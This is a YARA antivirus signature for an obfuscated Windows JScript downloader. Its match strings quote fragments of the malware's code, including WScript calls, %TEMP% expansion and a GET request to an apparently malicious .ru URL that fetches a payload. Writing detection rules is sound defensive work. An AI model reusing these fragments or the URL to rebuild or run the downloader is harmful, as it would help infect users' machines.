rule sig_20160428_db7c91468d43559c044cea6fd9ae9acb {
  meta:
    description = "datamaliciousorder - file 20160428_db7c91468d43559c044cea6fd9ae9acb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2b40762a0796ee3dc8fe62fbacb183bcbd802dcc6aaaacf259b6691b19269fa3"

  strings:
    $s1  = "function CeyDorSfyCviFpjFguOcu(XjlVsvDhbQqbGcdZhoCyu){NsqKhjMsuRsnTnsRtcJft[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function TgpOmqQgcHhtFgjYysGgf() {return NsqKhjMsuRsnTnsRtcJft[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function CeyDorSfyCviFpjFguOcu(XjlVsvDhbQqbGcdZhoCyu){NsqKhjMsuRsnTnsRtcJft[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var NsqKhjMsuRsnTnsRtcJft = function UyoXpcGwrXomCqdPytAzm() {return BeoXeoMmuWuqUiuNcvCnn[LkaQstMrkVvuQvxEdwBvn](\"WScript\"+\"" ascii
    $s5  = "function CtlWrgAocTfyGqgEnvOjc(QidHhkZrzMpcXqjGyrCct, QmpCrqKihFpeTdiMzhSzz){SwmSdjGdlAohPdtAxnLpi = SwmSdjGdlAohPdtAxnLpi * 1; " ascii
    $s6  = "return QidHhkZrzMpcXqjGyrCct - QmpCrqKihFpeTdiMzhSzz;};" fullword ascii
    $s7  = "var BeoXeoMmuWuqUiuNcvCnn = this[\"WScript\"];" fullword ascii
    $s8  = "var NsqKhjMsuRsnTnsRtcJft = function UyoXpcGwrXomCqdPytAzm() {return BeoXeoMmuWuqUiuNcvCnn[LkaQstMrkVvuQvxEdwBvn](\"WScript\"+\"" ascii
    $s9  = "function BitEwzPbiBbbLhpYgsGrk(AkzZviEabSpyErwLqhJqu) {var VglAqhZklJpqWwiCpmQih = (1, 2, 3, 4, 5, AkzZviEabSpyErwLqhJqu); retur" ascii
    $s10 = "function TgpOmqQgcHhtFgjYysGgf() {return NsqKhjMsuRsnTnsRtcJft[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function BitEwzPbiBbbLhpYgsGrk(AkzZviEabSpyErwLqhJqu) {var VglAqhZklJpqWwiCpmQih = (1, 2, 3, 4, 5, AkzZviEabSpyErwLqhJqu); retur" ascii
    $s12 = "function CtlWrgAocTfyGqgEnvOjc(QidHhkZrzMpcXqjGyrCct, QmpCrqKihFpeTdiMzhSzz){SwmSdjGdlAohPdtAxnLpi = SwmSdjGdlAohPdtAxnLpi * 1; " ascii
    $s13 = "function RxdNbaOadWtxQjeRpuIub(){return TqcXrdZuzHleZndSdsVsw + \"\";};" fullword ascii
    $s14 = "if (UhmEhuLntPoeKxbTwhVpz[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s15 = "function WazOzoYnoMikAxoHqiCfi() {return ((KtbZoqMojKcmLsjCniFwm == true) && (KtbZoqMojKcmLsjCniFwm == IjiJifMqrFzjGkbKwwEpr)) ?" ascii
    $s16 = "UhmEhuLntPoeKxbTwhVpz[RgqNrbYprUsqTxcOhbBnl](\"G\" + \"ET\", \"http://cafe-vintage68.ru/asad2fl\", false);" fullword ascii
    $s17 = "function WazOzoYnoMikAxoHqiCfi() {return ((KtbZoqMojKcmLsjCniFwm == true) && (KtbZoqMojKcmLsjCniFwm == IjiJifMqrFzjGkbKwwEpr)) ?" ascii
    $s18 = "var AtaQhuOroGsdIgzDmfBwh = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "var IjiJifMqrFzjGkbKwwEpr = false;" fullword ascii
    $s20 = "IjiJifMqrFzjGkbKwwEpr = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}